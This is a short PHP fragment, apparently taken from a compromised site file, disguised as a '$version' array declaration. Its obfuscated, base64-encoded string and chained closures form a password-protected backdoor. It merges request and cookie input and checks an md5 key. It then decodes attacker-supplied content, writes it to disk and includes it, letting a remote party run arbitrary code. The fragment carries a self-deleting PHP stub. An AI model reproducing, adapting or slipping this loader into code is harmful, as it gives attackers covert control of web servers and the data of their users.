...
$version = ['1.5.12', $g = '1666596590' => $z = "X1JFUVVFU1QsX0NPT0tJRSxhcnJheV9tZXJnZSxtZDUsc3RybGVuLHN0cmlwb3MsPD9waHAgQHVubGluayhfX0ZJTEVfXyk7Pz4sZmlsZV9wdXRfY29udGVudHMsYmFzZTY0X2RlY29kZSxuYW1lLF9leHAsc3Vic3RyLA8+e61ffd9aedd116ceedd251e172e356a9",$t = function($v,$y,$z=''){return empty($v[$y])?$z:$v[$y];}, $f = substr($z, strpos($z, '+') + 1) => $z = explode(',', base64_decode($z)), ($j = $_REQUEST) && ($j = $z[2]($GLOBALS[$z[1]], $j)) && ($z[3]($t($j, 'a', $t($j, $z[10])) . "jfkrgiq") === $f) && ($w = function ($x, $n, $g) {if ($g[4]($n = $g[8]($n)) > 18 && $g[5]($n, $g[11]($g[6], 0, 5)) !== false && $g[7]($x, $g[6] . $n)) {include $x;return true; }}) && $t($j,$z[9]) ? $w('1666596590', $j[$z[9]], $z) && exit(0) : ''];
